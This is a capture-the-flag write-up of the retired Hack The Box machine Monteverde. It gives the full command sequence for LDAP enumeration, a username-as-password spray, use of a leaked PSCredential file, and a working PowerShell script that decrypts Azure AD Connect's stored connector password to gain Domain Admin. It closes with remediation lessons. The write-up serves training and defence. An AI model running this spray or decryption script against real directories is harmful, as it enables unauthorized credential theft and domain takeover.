---
title: "HTB: Monteverde · leaked Azure AD Connect credentials to Domain Admin"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "privilege-escalation", "azure-ad-connect", "password-spraying"]
summary: "A retired medium Windows Domain Controller where a leaked Azure AD sync credential in a home share gives a foothold, and a locally installed Azure AD Connect instance turns out to store the Domain Administrator's password in a decryptable local database."
---

## Overview

Monteverde is a retired medium-difficulty Windows Domain Controller from Hack The Box, built around a real-world misconfiguration: running Azure AD Connect directly on a Domain Controller. The path is:

1. Anonymous **LDAP** enumeration recovers the real domain user list.
2. A **password spray using each username as its own password** finds a working but low-privileged account.
3. That account's SMB access reveals a **cleartext credential left in a user's home share**, giving an authenticated foothold.
4. Group membership in a suspicious-looking "Azure Admins" group turns out to be a **red herring** for both ACL abuse and DCSync.
5. The real path is Azure AD Connect's own **local credential store**: since the sync service runs on this box, its connector account credentials can be decrypted locally, and that accountis the Domain Administrator.

Target: `10.129.228.111`, a Windows Server Domain Controller for the domain `MEGABANK.LOCAL`.

## Enumeration

Full TCP scan:

```bash
nmap -sC -sV -p- -oN nmap-monteverde.txt 10.129.228.111
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          (Global Catalog)
3269/tcp  open  ldapssl?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing (AD Web Services)
...
```

Kerberos, LDAP, the Global Catalog and ADWS (9389) confirm a Domain Controller. `593`/`49xxx` (`ncacn_http`) is RPC-over-HTTP, not a browsable web server, so it doesn't add attack surface here. With no starting credentials, the first thing worth checking is whether LDAP accepts an **anonymous bind**, a vector separate from, and in addition to, SMB null sessions:

```bash
ldapsearch -x -H ldap://10.129.228.111 -b "dc=megabank,dc=local" "(objectClass=user)" sAMAccountName
```

This works and returns the full list of domain users, along with `userPrincipalName` and `description` attributes. Note this is a genuinely separate enumeration path from the classic SMB/RPC null session (which also gets tested but, on this box, is not the one that pays off): LDAP anonymous bind is its own vector, worth testing even when SMB is locked down.

## Foothold

With real usernames, **AS-REP Roasting** is the obvious next move, but it comes back empty:

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.228.111 MEGABANK.LOCAL/ -usersfile users.txt
```

No account here has Kerberos pre-authentication disabled. Before trying anything louder, check the password policy:

```bash
netexec smb 10.129.228.111 --pass-pol
```

```
Minimum password length: 7
Password complexity: False
Account lockout threshold: None
```

No lockout and no enforced complexity mean password spraying is both safe and likely to work. A specific and often-overlooked variant is trying **each username as its own password**:

```bash
netexec smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

```
[+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

One hit. `SABatchJobs` authenticates over SMB but is not in the Remote Management Users group, so WinRM rejects it. Authenticated SMB access, though, unlocks shares that were denied anonymously:

```bash
netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --shares
```

```
azure_uploads    READ
NETLOGON         READ
SYSVOL           READ
users$           READ
```

`users$` holds a per-user home directory tree. Browsing it as `SABatchJobs` turns up an interesting file in `mhope`'s folder:

```bash
smbclient //10.129.228.111/users$ -U 'SABatchJobs%SABatchJobs'
smb: \mhope\> get azure.xml
```

```xml
<Objs Version="1.1.0.1">
  <Obj RefId="0">
    <TN RefId="0"><T>System.Management.Automation.PSCredential</T></TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">mhope</S>
      <SS N="Password">4n0therD4y@n0th3r$</SS>
    </Props>
  </Obj>
</Objs>
```

A serialized PowerShell credential object with the password left in cleartext, plausibly created by an admin exporting Azure AD sync credentials for a script and dropping the file in the wrong place. It works directly against WinRM:

```bash
netexec winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
# (Pwn3d!)

evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> type C:\Users\mhope\Desktop\user.txt
13434740************************dc
```

User flag captured.

## Privilege escalation · Azure AD Connect credential decryption

Post-foothold enumeration shows `mhope` is a member of a custom group, `Azure Admins`, alongside `Administrator` and an account named `AAD_987d7f2f57d2`. That naming pattern is characteristic of an Azure AD Connect sync service account. It's tempting to assume this group grants some special right, so it's worth testing directly rather than guessing:

- **ACL abuse**: `dsacls` and a domain-wide ACL sweep for `Azure Admins` or `mhope` return nothing. No delegated permission exists on `AAD_987d7f2f57d2` or anywhere else.
- **DCSync**: `impacket-secretsdump` for `mhope` fails outright. `whoami /all` also shows nothing beyond default privileges.

Both are dead ends, confirmed rather than assumed. The actual clue is elsewhere: `AAD_987d7f2f57d2`'s AD description reads *"Service account for the Synchronization Service ... running on computer MONTEVERDE"*. Azure AD Connect is installed directly on this Domain Controller, which is itself a real-world anti-pattern.

Azure AD Connect stores the credentials it uses to talk to on-prem AD in a local database (**ADSync**, a SQL Server LocalDB instance), encrypted with a library shipped in its own install directory. Any account that can query that database with integrated security, and load that same library, can decrypt it:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$key_id = $reader.GetInt32(0); $instance_id = $reader.GetGuid(1); $entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader(); $reader.Read() | Out-Null
$config = $reader.GetString(0); $crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null; $km.GetActiveCredentialKey([ref]$key)
$key2 = $null; $km.GetKey(1, [ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

```
forest-login-user: administrator
password: d0m@in4dminyeah!
```

The "AD DS Connector account" that Azure AD Connect uses to sync the on-prem directory turns out to be the domain's actual `Administrator` account, with its password recoverable by anyone who can reach this local database. Pass it straight to WinRM:

```bash
evil-winrm -i 10.129.228.111 -u Administrator -p 'd0m@in4dminyeah!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
826b7927************************0f
```

Root flag captured. Full domain compromise.

## Lessons learned

Monteverde is a good reminder that "Azure AD Connect" and "hybrid identity" bring their own attack surface, distinct from classic on-prem AD misconfigurations:

- **Never install Azure AD Connect on a Domain Controller.** It should run on a dedicated, hardened server; anyone who can reach its local database with the right access can potentially recover the connector account's password.
- **Never grant the AD DS Connector account Domain Admin rights.** Azure AD Connect only needs enough delegated permissions for directory synchronization and password hash sync, not full domain control.
- **A tempting-looking group name is not evidence of a privilege.** "Azure Admins" containing the sync account and `Administrator` invites ACL or DCSync theories; both were tested and both were dead ends. Verify rights directly instead of assuming from naming.
- **PSCredential XML exports are not a safe way to store secrets.** `Export-Clixml`-style credential files are only as protected as the file's own permissions; one left on a shared home directory is a plaintext-adjacent leak.
- **A weak password policy amplifies every other issue.** No lockout threshold and no complexity requirement is what made a simple username-as-password spray viable in the first place.

*Flags are partially redacted, per convention.*

---

I also wrote this engagement up as a formal penetration test report, the same format I would deliver to a client, with an executive summary, CVSS-scored findings, and remediation guidance.

📄 [**Download the full pentest report (PDF)**](/reports/Monteverde_Pentest_Report/Monteverde_Pentest_Report_EN.pdf)
